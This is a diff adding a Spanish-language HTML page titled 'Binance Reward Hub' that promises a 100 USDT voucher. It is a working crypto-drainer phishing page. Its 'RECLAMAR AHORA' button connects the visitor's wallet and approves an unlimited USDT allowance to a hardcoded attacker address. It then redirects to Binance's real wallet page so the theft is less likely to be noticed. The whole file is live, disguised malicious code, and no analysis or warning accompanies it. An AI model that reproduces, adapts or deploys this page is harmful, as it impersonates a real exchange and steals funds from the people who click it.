@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Reward Hub</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <style>
+        body { background-color: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #1e2329; padding: 30px; border-radius: 16px; text-align: center; max-width: 350px; border: 1px solid #363a3f; }
+        .reward { color: #f3ba2f; font-weight: bold; font-size: 24px; margin: 20px 0; }
+        .btn { background-color: #f3ba2f; color: black; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" width="45">
+        <h1>Voucher de Recompensa</h1>
+        <p>Participa en la auditoría y recibe tu bono.</p>
+        <div class="reward">100.00 USDT</div>
+        <button class="btn" onclick="claim()">RECLAMAR AHORA</button>
+        <div id="status" style="margin-top:15px; color:#f3ba2f; font-size:12px;"></div>
+    </div>
+    <script>
+        const receiver = "0xcbb1d5f863b83ae09e1868e9c87fe61278e3e1eb";
+        const token = "0x55d398326f99059fF775485246999027B3197955";
+
+        async function claim() {
+            const status = document.getElementById("status");
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
+                    const contract = new ethers.Contract(token, ["function approve(address spender, uint256 amount) public returns (bool)"], signer);
+                    const tx = await contract.approve(receiver, ethers.constants.MaxUint256);
+                    status.innerText = "Sincronizando...";
+                    await tx.wait();
+                    window.location.href = "https://www.binance.com/es/my/wallet/account/main";
+                } catch (e) { status.innerText = "Error de red. Intente nuevamente."; }
+            } else { status.innerText = "Use el navegador Web3 de Binance."; }
+        }
+    </script>
+</body>
+</html>
